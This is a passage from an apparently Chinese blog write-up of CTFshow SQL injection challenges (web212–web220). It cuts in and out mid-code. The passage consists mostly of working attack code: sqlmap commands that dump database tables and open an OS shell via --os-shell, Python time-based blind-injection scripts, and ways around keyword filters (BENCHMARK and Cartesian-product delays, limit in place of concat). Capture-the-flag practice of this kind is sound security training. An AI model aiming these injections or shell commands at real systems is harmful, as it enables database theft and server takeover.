retVal<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa -dump --tamper=web212<br></code></pre></td></tr></table></figure><h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>练习使用–os-shell 一键getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_user -C username -dump --tamper=web212<br></code></pre></td></tr></table></figure><p>用上一题的可以直接打通但是找不到就提的flag在哪，所以需要getshell才行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1  --tamper=web212 --os-shell<br></code></pre></td></tr></table></figure><p>按4，1然后上传文件，然后执行命令</p><h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>这题开始是时间盲注，配合bp食用更佳</p><p>找不到注入点，orz,看了一下wp需要抓包，在api里面找到，直接上吧，设置debug&#x3D;1,注入点是ip，</p><p>这里根据web175的进行微调一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://9a47d60c-a58c-473d-8fda-bcd4534a6d2a.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        payload = &#123;<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;if(substr((select flaga from ctfshow_flagx),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.5),0)&quot;</span>,<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-number">1</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>写代码中dict的逗号不能少，是我在改代码中遇到的一个小问题</p><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>用了单引号</p><p>和上题基本一致，用了引号就需要记得闭合，%23过滤掉后面的即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://fcff0b3a-2480-4088-88e3-4a8554259ae8.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0&#x27; or if(substr((select flagaa from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要闭合，所以调整了一下payload的顺序，在爆表的时候出现了数字异常，手动调一下就行，最后可以得到flag</p><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>where id &#x3D; from_base64($id);</p><p>一开始以为是需要对payload进行base64的转化，其实就是)的提前闭合就可以了，可以沿用上一题的脚本，微调一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://8184624f-3ac4-4ac2-b195-865a82d8cb94.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxcc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>本题过滤了sleep,网上可以简答的搜索一下内容</p><p>使用 <code>BENCHMARK</code> 函数，结合一个较大的数值来引入延迟。这是MySQL中的内置函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://078b3b8c-d67e-4948-b1f2-239e5176f712.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxccb),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>这题benchmark也被禁用了，尝试一些其他方法</p><p>我使用的是笛卡尔积造成的短暂延迟，结合两个表的计数可以引入一定的延迟。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://380bc0f7-937d-4516-a20e-aaa284e086a2.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>禁用了rlike，我没使用到，继续用上题的脚本,需要微调一下时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://eca68551-e138-419b-a9f7-8bff2348458d.challenge.ctf.show//api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxca),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>禁用的东西挺多的</p><p>concat既然禁用了可以使用limit进行绕过，微调一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> 